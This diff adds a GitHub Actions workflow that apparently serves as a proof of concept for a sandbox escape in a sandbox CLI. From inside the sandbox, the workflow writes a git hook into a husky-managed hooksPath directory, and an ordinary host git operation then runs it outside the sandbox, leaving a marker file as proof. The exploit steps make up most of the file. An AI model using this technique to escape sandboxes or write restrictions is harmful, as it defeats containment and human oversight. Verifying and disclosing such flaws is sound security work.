@@ -1,0 +1,100 @@
+name: verify-linux-hookspath-poc
+
+on:
+  workflow_dispatch: {}
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      - name: Install system dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y bubblewrap libseccomp-dev gcc ripgrep
+
+      - name: Enable unprivileged user namespaces
+        run: |
+          sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0 || true
+          sudo sysctl -w kernel.unprivileged_userns_clone=1 || true
+          bwrap --unshare-pid --unshare-user --cap-drop ALL --ro-bind / / --proc /proc true
+
+      - name: Install deps and build (including seccomp helper, like upstream CI)
+        run: |
+          npm install
+          npm run build:seccomp
+          npm run build
+
+      - name: Set up a project exactly like `npx husky init` leaves behind
+        run: |
+          set -euo pipefail
+          W=$(mktemp -d)
+          echo "W=$W" >> "$GITHUB_ENV"
+          mkdir -p "$W/home" "$W/proj"
+          cd "$W/proj"
+          git init -q -b main .
+          git config user.email t@t && git config user.name t && git config commit.gpgsign false
+          echo 'console.log(1)' > index.js
+          mkdir -p .husky/_
+          printf '#!/usr/bin/env sh\nnpm test\n' > .husky/pre-commit
+          printf '*' > .husky/_/.gitignore
+          printf '#!/usr/bin/env sh\n[ "$HUSKY" = "2" ] && set -x\nn=$(basename "$0")\ns=$(dirname "$(dirname "$0")")/$n\n[ ! -f "$s" ] && exit 0\nsh -e "$s" "$@"\n' > .husky/_/h
+          for h in pre-commit post-checkout post-merge pre-push commit-msg post-rewrite; do
+            printf '#!/usr/bin/env sh\n. "$(dirname "$0")/h"' > ".husky/_/$h"; chmod +x ".husky/_/$h"
+          done
+          git config core.hooksPath .husky/_
+          git add index.js .husky/pre-commit
+          git -c core.hooksPath=/dev/null commit -qm init
+          echo "--- confirms this project shape is exactly what husky v9 leaves ---"
+          git config --get core.hooksPath
+
+      - name: Write ordinary srt policy (project writable, nothing else)
+        run: |
+          cat > "$W/srt-settings.json" <<'JSON'
+          { "network": { "allowedDomains": [], "deniedDomains": [] },
+            "filesystem": { "denyRead": [], "allowWrite": ["."], "denyWrite": [] } }
+          JSON
+
+      - name: Run ONE sandboxed command — controls + the actual write
+        working-directory: ${{ env.W }}/proj
+        run: |
+          set -x
+          env -i HOME="$W/home" PATH="$PATH" GIT_CONFIG_NOSYSTEM=1 node "$GITHUB_WORKSPACE/dist/cli.js" --settings "$W/srt-settings.json" -c '
+            echo "[sandbox] control 1: .git/hooks/post-checkout"
+            ( : > .git/hooks/post-checkout ) 2>/dev/null && echo "  WRITABLE (BAD)" || echo "  denied (srt mandatory deny works)"
+            echo "[sandbox] control 2: .git/config"
+            ( echo >> .git/config ) 2>/dev/null && echo "  WRITABLE (BAD)" || echo "  denied (srt mandatory deny works)"
+            echo "[sandbox] control 3: \$HOME"
+            ( : > "$HOME/x" ) 2>/dev/null && echo "  WRITABLE (BAD)" || echo "  denied (outside allowWrite)"
+            echo "[sandbox] write .husky/_/post-checkout (the hook git actually runs)"
+            printf "#!/usr/bin/env sh\n{ echo HOOK_RAN_OUTSIDE_SANDBOX; id; } > \"\$HOME/PWNED\"\n. \"\$(dirname \"\$0\")/h\"\n" > .husky/_/post-checkout && echo "  WRITTEN"
+          '
+          echo "srt exited: $?"
+
+      - name: Trigger — ordinary host git operation, outside the sandbox
+        working-directory: ${{ env.W }}/proj
+        env:
+          HOME: ${{ env.W }}/home
+        run: |
+          set -x
+          echo "[host] git status --short (empty = nothing visible):"
+          git status --short
+          echo "[host] git switch -c feature"
+          git switch -q -c feature
+          echo "--- result ---"
+          if [ -f "$HOME/PWNED" ]; then
+            echo "CONFIRMED: hook planted inside the sandbox ran OUTSIDE it on an ordinary git operation"
+            cat "$HOME/PWNED"
+          else
+            echo "NOT CONFIRMED: hook did not execute (finding does not reproduce on this build)"
+            exit 1
+          fi
+
+      - name: Summary
+        if: always()
+        run: echo "See step outputs above for WRITTEN / denied / CONFIRMED markers."
